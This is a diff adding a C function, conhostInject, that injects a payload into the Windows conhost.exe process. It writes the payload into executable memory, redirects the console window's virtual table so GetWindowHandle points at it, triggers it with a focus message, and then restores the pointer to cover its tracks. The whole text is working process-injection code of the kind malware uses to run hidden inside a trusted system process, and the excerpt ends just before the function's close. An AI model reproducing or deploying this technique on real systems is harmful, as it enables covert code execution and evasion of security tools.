@@ -1,0 +1,55 @@
+VOID conhostInject(LPVOID payload, DWORD payloadSize) {
+    HWND          hwnd;
+    LONG_PTR      udptr;
+    DWORD         pid, ppid;
+    SIZE_T        wr;
+    HANDLE        hp;
+    ConsoleWindow cw;
+    LPVOID        cs, ds;
+    ULONG_PTR     vTable;
+    
+    // 1. Obtain handle and process id for a console window 
+    //   (this assumes one already running)
+    hwnd = FindWindow(L"ConsoleWindowClass", NULL);
+    
+    GetWindowThreadProcessId(hwnd, &ppid);
+    // 2. Obtain the process id for the host process 
+    pid = conhostId(ppid);
+    
+    // 3. Open the conhost.exe process
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    // 4. Allocate RWX memory and copy the payload there
+    cs = VirtualAllocEx(hp, NULL, payloadSize, 
+      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+    
+    // 5. Read the address of current virtual table
+    udptr = GetWindowLongPtr(hwnd, GWLP_USERDATA);
+    ReadProcessMemory(hp, (LPVOID)udptr, 
+        (LPVOID)&vTable, sizeof(ULONG_PTR), &wr);
+    
+    // 6. Read the current virtual table into local memory
+    ReadProcessMemory(hp, (LPVOID)vTable, 
+      (LPVOID)&cw, sizeof(ConsoleWindow), &wr);
+      
+    // 7. Allocate RW memory for the new virtual table
+    ds = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow), 
+      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // 8. update the local copy of virtual table with 
+    //    address of payload and write to remote process
+    cw.GetWindowHandle = (ULONG_PTR)cs;
+    WriteProcessMemory(hp, ds, &cw, sizeof(ConsoleWindow), &wr); 
+    // 9. Update pointer to virtual table in remote process
+    WriteProcessMemory(hp, (LPVOID)udptr, &ds, 
+      sizeof(ULONG_PTR), &wr); 
+    // 10. Trigger execution of the payload
+    SendMessage(hwnd, WM_SETFOCUS, 0, 0);
+    // 11. Restore pointer to original virtual table
+    WriteProcessMemory(hp, (LPVOID)udptr, &vTable, 
+      sizeof(ULONG_PTR), &wr);
+    
+    // 12. Release memory and close handles
+    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
+    
+    CloseHandle(hp);
